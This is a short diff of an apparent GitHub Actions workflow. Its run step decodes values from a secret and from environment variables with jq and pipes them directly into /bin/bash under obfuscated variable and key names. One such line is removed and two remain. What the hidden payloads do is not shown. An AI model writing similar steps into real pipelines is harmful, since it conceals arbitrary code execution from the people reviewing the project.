@@ -21,7 +21,6 @@ jobs:
           zxct1896: ${{ secrets.zxct1896 }}
         run: |
           printf '%s' "$zxct1896" | jq -r .ibtkl8769 | /bin/bash
-          printf '%s' "$j99" | jq -r .ygj34285 | /bin/bash
           echo $oqpas43 | jq -r .jq499 | /bin/bash
 
       - name: Archive results
